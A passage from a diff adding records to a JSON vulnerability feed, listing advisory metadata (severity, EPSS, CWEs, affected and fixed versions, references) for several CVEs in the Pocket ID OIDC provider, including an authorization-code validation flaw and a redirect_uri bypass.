+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00247,
+        "percentile": 0.16167,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-285",
+        "CWE-613"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.6.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-w6p7-2fxx-4f44",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-43983",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-43983",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-43983",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-43983",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-w6p7-2fxx-4f44",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-w6p7-2fxx-4f44",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:2c1cb89544ed92456ccb668723a5df8543f9b734cad8cef39bfa523893ab77b9",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-28513",
+      "aliases": [
+        "GHSA-qh6q-598w-w6m2"
+      ],
+      "title": "Pocket ID: OIDC authorization code validation uses AND instead of OR, allowing cross-client token exchange",
+      "summary": "Pocket ID is an OIDC provider that allows users to authenticate with their passkeys to your services. Prior to 2.4.0, the OIDC token endpoint rejects an authorization code only when both the client ID is wrong and the code is expired. This allows cross-client code exchange and expired code reuse. This vulnerability is fixed in 2.4.0.",
+      "published_at": "2026-03-07T17:38:25.000Z",
+      "modified_at": "2026-03-10T14:32:17.637Z",
+      "severity": {
+        "level": "high",
+        "score": 8.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00308,
+        "percentile": 0.24001,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "0",
+              "last_affected": "2.3.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-qh6q-598w-w6m2",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-28513",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-28513",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-28513",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-28513",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-qh6q-598w-w6m2",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-qh6q-598w-w6m2",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:dfa3538e6d2dc7c907a7263a688b3b35d14610157f055058f6348ca8148db384",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-28512",
+      "aliases": [
+        "GHSA-9h33-g3ww-mqff"
+      ],
+      "title": "Pocket ID: OAuth redirect_uri validation bypass via userinfo/host confusion",
+      "summary": "Pocket ID is an OIDC provider that allows users to authenticate with their passkeys to your services. From 2.0.0 to before 2.4.0, a flaw in callback URL validation allowed crafted redirect_uri values containing URL userinfo (@) to bypass legitimate callback pattern checks. If an attacker can trick a user into opening a malicious authorization link, the authorization code may be redirected to an attacker-controlled host. This vulnerability is fixed in 2.4.0.",
+      "published_at": "2026-03-07T17:37:32.000Z",
+      "modified_at": "2026-03-10T14:32:52.265Z",
+      "severity": {
+        "level": "high",
+        "score": 7.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00246,
+        "percentile": 0.16036,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-601"
+      ],
+      "affected": [
+        {
+          "product": "pocket-id",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-9h33-g3ww-mqff",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/pocket-id/pocket-id/commit/3a339e33191c31b68bf57db907f800d9de5ffbc8",
+          "type": "fix"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-28512",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-28512",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-28512",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-28512",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-9h33-g3ww-mqff",
+          "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-9h33-g3ww-mqff",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:b5d542e38e6a7c7a96b8fc4edc5b235d77eb458030334e771dc7f265f3cb53e6",
+      "note": null
+    }
+  ]
+}
